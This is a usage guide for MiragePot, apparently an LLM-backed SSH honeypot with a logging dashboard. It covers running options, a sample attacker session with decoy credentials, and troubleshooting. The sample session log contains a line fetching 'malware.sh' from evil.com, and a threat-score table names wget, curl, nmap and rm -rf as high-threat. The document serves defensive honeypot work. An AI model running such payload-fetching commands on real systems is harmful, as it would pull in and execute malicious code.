# Usage Guide

This guide covers how to run and use MiragePot effectively.

## Quick Start

```bash
# Start everything (honeypot + dashboard)
python run.py

# Or just the honeypot
miragepot

# Or with dashboard
miragepot --dashboard
```

## Running MiragePot

### Method 1: Unified Runner (Recommended)

The `run.py` script starts both the honeypot and dashboard:

```bash
python run.py
```

Output:
```
[*] Starting MiragePot backend... (python -m miragepot.server)
[*] Starting MiragePot dashboard... (streamlit run dashboard/app.py)

MiragePot is running.
- SSH honeypot: ssh root@127.0.0.1 -p 2222
- Dashboard: see URL printed by Streamlit (default http://localhost:8501)

Press Ctrl+C here to stop both.
```

### Method 2: CLI Command

After installation, use the `miragepot` command:

```bash
# Basic usage
miragepot

# With options
miragepot --port 2222 --host 0.0.0.0 --log-level DEBUG

# With dashboard
miragepot --dashboard --dashboard-port 8501
```

### Method 3: Python Module

Run as a Python module:

```bash
python -m miragepot --port 2222
```

### Method 4: Make Commands

Using the Makefile:

```bash
make run        # Start honeypot + dashboard
make server     # Start only honeypot
make dashboard  # Start only dashboard
```

## Command Line Options

```
miragepot [OPTIONS]

Options:
  --host HOST           SSH bind address (default: 0.0.0.0)
  --port, -p PORT       SSH port (default: 2222)
  --dashboard, -d       Also start the Streamlit dashboard
  --dashboard-port      Dashboard port (default: 8501)
  --log-level, -l LEVEL Logging level (DEBUG, INFO, WARNING, ERROR)
  --version, -v         Show version and exit
  --help                Show this message and exit
```

## Testing the Honeypot

### Connect via SSH

```bash
# Connect to the honeypot
ssh root@127.0.0.1 -p 2222

# Any password will be accepted
Password: anything
```

### Example Session

```bash
$ ssh root@127.0.0.1 -p 2222
root@127.0.0.1's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-86-generic x86_64)
Last login: just now from unknown

root@miragepot:~# whoami
root

root@miragepot:~# pwd
/root

root@miragepot:~# ls
notes.txt  passwords.txt

root@miragepot:~# cat passwords.txt
# Legacy admin credentials (DO NOT SHARE)
admin:OldPortal!2020
backup:BackupUser#123
webadmin:WebAdm1n!

root@miragepot:~# uname -a
Linux miragepot 5.15.0-86-generic #96-Ubuntu SMP x86_64 GNU/Linux

root@miragepot:~# exit
logout
Connection to 127.0.0.1 closed.
```

## Dashboard Usage

### Accessing the Dashboard

1. Start MiragePot with dashboard:
   ```bash
   python run.py
   # or
   miragepot --dashboard
   ```

2. Open in browser: http://localhost:8501

### Dashboard Features

- **Session Overview**: Table of all attacker sessions
- **Statistics**: Total sessions, commands, unique IPs, high-threat commands
- **Session Details**: Timeline view of commands for each session
- **Threat Scoring**: Color-coded threat levels for each command
- **Auto-refresh**: Automatically updates with new data

### Dashboard Controls

- **Refresh Now**: Manually refresh data
- **Auto-refresh**: Toggle automatic refreshing
- **Interval**: Set refresh interval (5, 10, 30, 60 seconds)
- **Session Selector**: Choose a session to inspect

## Understanding Logs

### Session Logs

Each attacker session creates a JSON file in `data/logs/`:

```json
{
  "session_id": "session_1705678900000_12345",
  "attacker_ip": "192.168.1.100",
  "login_time": "2024-01-19T15:21:40.000Z",
  "commands": [
    {
      "timestamp": "2024-01-19T15:21:45.000Z",
      "command": "whoami",
      "response": "root\n",
      "threat_score": 5,
      "delay_applied": 0.0
    },
    {
      "timestamp": "2024-01-19T15:21:50.000Z",
      "command": "wget http://evil.com/malware.sh",
      "response": "...",
      "threat_score": 60,
      "delay_applied": 1.5
    }
  ]
}
```

### Threat Score Levels

| Score | Level | Color | Examples |
|-------|-------|-------|----------|
| 0-29 | Low | Green | `ls`, `pwd`, `whoami` |
| 30-79 | Medium | Yellow | `sudo`, `chmod`, `ssh` |
| 80+ | High | Red | `wget`, `curl`, `nmap`, `rm -rf` |

### Console Output

Server logs show connection events:

```
2024-01-19 15:21:40 - miragepot.server - INFO - New connection from 192.168.1.100:54321
2024-01-19 15:25:10 - miragepot.server - INFO - Session with 192.168.1.100 ended
```

## Advanced Usage

### Running on Standard SSH Port

To run on port 22 (standard SSH port):

```bash
# Option 1: Run as root (not recommended)
sudo miragepot --port 22

# Option 2: Use port forwarding
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222

# Option 3: Use capabilities
sudo setcap 'cap_net_bind_service=+ep' $(which python3)
miragepot --port 22
```

### Running in Background

```bash
# Using nohup
nohup miragepot > miragepot.log 2>&1 &

# Using screen
screen -S miragepot
miragepot
# Detach with Ctrl+A, D

# Using systemd (create service file)
sudo systemctl start miragepot
```

### Multiple Instances

Run multiple honeypots on different ports:

```bash
# Terminal 1
MIRAGEPOT_SSH_PORT=2222 miragepot

# Terminal 2
MIRAGEPOT_SSH_PORT=2223 miragepot
```

### Custom LLM Model

Use a different Ollama model:

```bash
# Pull the model first
ollama pull llama2

# Start with custom model
MIRAGEPOT_LLM_MODEL=llama2 miragepot
```

## Troubleshooting

### Honeypot Not Responding

1. Check if Ollama is running:
   ```bash
   ollama list
   ```

2. Check port availability:
   ```bash
   lsof -i :2222
   ```

3. Check logs for errors:
   ```bash
   miragepot --log-level DEBUG
   ```

### Slow Responses

1. Ollama might be loading the model. First query is slowest.
2. Try a smaller model: `MIRAGEPOT_LLM_MODEL=phi3`
3. Reduce timeout: `MIRAGEPOT_LLM_TIMEOUT=15`

### Dashboard Not Loading

1. Check if Streamlit is installed:
   ```bash
   pip install streamlit
   ```

2. Check if port 8501 is available:
   ```bash
   lsof -i :8501
   ```

### No Session Logs

1. Check `data/logs/` directory exists
2. Verify write permissions
3. Make sure attacker actually ran commands (not just connected)

## Security Considerations

1. **Network Isolation**: Run in a separate network segment
2. **Resource Limits**: Monitor CPU/memory usage
3. **Log Monitoring**: Set up alerts for high-threat activity
4. **Updates**: Keep Ollama and models updated
5. **Backup Logs**: Regularly backup session logs

## See Also

- [INSTALL.md](INSTALL.md) - Installation guide
- [CONFIGURATION.md](CONFIGURATION.md) - Configuration options
- [architecture.md](architecture.md) - System architecture
- [attacker_playbook.md](attacker_playbook.md) - Simulated attack scenarios
